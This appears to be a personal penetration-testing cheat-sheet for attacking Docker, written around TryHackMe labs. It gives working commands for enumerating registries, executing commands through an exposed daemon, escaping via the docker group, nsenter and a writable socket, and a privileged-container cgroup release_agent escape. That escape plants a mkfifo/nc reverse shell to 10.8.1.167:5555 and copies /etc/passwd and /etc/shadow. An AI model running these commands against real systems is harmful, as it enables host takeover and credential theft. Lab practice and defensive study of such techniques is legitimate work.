#### Docker registries
A docker registry is a storage and distribution system for named Docker images. 
The registry is organized into Docker repositories, with information about the current images.
The default port is 5000.

To enumerate Docker registries, use [[docker-grabber]]
To query the Docker images:
```
curl http://IP:PORT/v2/_catalog                        // Get all active Docker images.
curl http://IP:PORT/v2/REPOSITORY/NAME/tags/list       // Get tags of an image.
curl http://IP:PORT/v2/REPOSITORY/NAME/manifests/TAG   // Get info of a tag (usually contains command history)
```

#### Reverse engineering
If you're able to query the data inside of the docker registry (see [[#Docker registries]]), `docker pull` the registry:
```c++
nano /etc/docker/daemon.json
add IP:PORT to the list
systemctl stop docker*
systemctl start docker
systemctl start docker.socket

docker info   // Check if the IP has been added to the insecure registries.
```
try dumping the docker images with [[Dive]]

#### Exposed docker daemon
If you find an exposed docker daemon (Nmap docker, with a lot of info), you can communicate with the image inside.

Example `nmap` output:
```
┌─[root@edu-virtualbox]─[.../edu/THM]
└──╼ #nmap -A -p2375 10.10.68.223
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-11 16:41 CET
Nmap scan report for 10.10.68.223
Host is up (0.044s latency).
                                                           
PORT     STATE SERVICE VERSION
2375/tcp open  docker  Docker 20.10.20 (API 1.41)
| docker-version:         
|   BuildTime: 2022-10-18T18:18:12.000000000+00:00
|   ApiVersion: 1.41                                    
|   KernelVersion: 5.15.0-1022-aws
|   Version: 20.10.20        
|   Platform:                
|     Name: Docker Engine - Community
|   GitCommit: 03df974
|   GoVersion: go1.18.7      
|   Components: 
|                       
|       Name: Engine  
|       Version: 20.10.20
|       Details:                                                                                                       
|         ApiVersion: 1.41
|         KernelVersion: 5.15.0-1022-aws
|         BuildTime: 2022-10-18T18:18:12.000000000+00:00
|         GitCommit: 03df974
|         GoVersion: go1.18.7         
|         Experimental: false
|         Arch: amd64    
|         Os: linux    
|         MinAPIVersion: 1.12
|                           
|       Name: containerd
|       Version: 1.6.8
|       Details:       
|         GitCommit: 9cd3357b7fd7218e4aec3eae239db1f68a5a6ec6                                        
|                                                                                                                                                                                                                                              |       Name: runc                               
|       Version: 1.1.4                                   
|       Details:        
|         GitCommit: v1.1.4-0-g5fd4c4d
|     
|       Name: docker-init       
|       Version: 0.19.0
|       Details:     
|         GitCommit: de40ad0
|   Arch: amd64
|   Os: linux                                                                                                          
|_  MinAPIVersion: 1.12                                                                                                

```

To confirm access, use `curl http://IP:PORT/version`
The default port is `2375`

To execute code:
```
docker -H tcp://IP:PORT ps                        // List running images
// Note: if there are no containers running, use the commands "images" to list, and "run", to run a container.
docker -H tcp://IP:PORT exec CONTAINER_ID COMMAND // Execute a command in a container 
```

#### Exposed internal docker daemon
Assuming you've got a foothold on the target system, check for the "Docker" group using `groups`
##### Initial check:
```
user@machine:~#groups
sudo docker                  // "docker" group is enabled
```
##### Exploitation
```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh         // Mount the host system to the internal image
// IMPORTANT NOTE: This won't work on THM servers, or other places without access to the internet.
// To bypass this, replace the "alpine" with the ID of the box, like this:
docker images                                               // Copy the ID of any of the available images.
docker run -v /:/mnt --rm -it ANY_IMAGE_ID chroot /mnt sh   // Mount the host system to the internal image
```

##### Shared namespaces
If you see a lot of processes when running `ps aux`  generally 20+, try this:
```
nsenter --target 1 --mount sh
```
`--target 1`  -- The targetted process (and the target namespace)
`--mount`  -- the mount namespace of the target process
`sh`  -- Execute `sh` in the namespace (kernel)

#### Capabilities
Requirement: a Docker image with `privileged` mode enabled.
The `priveleged` mode means that all capabilities have been granted to the Docker image, allowing it to bypass the Docker Engine and reach the system.
To check if the image is Privileged, use
```
capsh --print                    // If this gives lots of output, privileged mode is likely enabled.
capsh --print | grep sys_admin   // If this returns output, it is exploitable.
```

Exploitation:
```
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

echo '#!/bin/sh' > /cmd
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.8.1.167 5555 >/tmp/f" >> /cmd
echo "cat /etc/passwd > $host_path/output" >> /cmd
echo "cat /etc/shadow > $host_path/output"
chmod a+x /cmd

sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

#### Writable docker socket
To get root in the docker, upload a docker binary.
Secondly, run 
```
./docker run --entrypoint /bin/bash -it --rm HOST_IMAGE_NAME
```

#### Scanning the host
The host of the docker's IP is usually 172.17.0.1
To make sure, use:
```
/sbin/ip route|awk '/default/ { print $3 }'
```
if you scan it using `nmap`, you might find something


### miscellaneous
get full tty: `script /dev/null -c bash`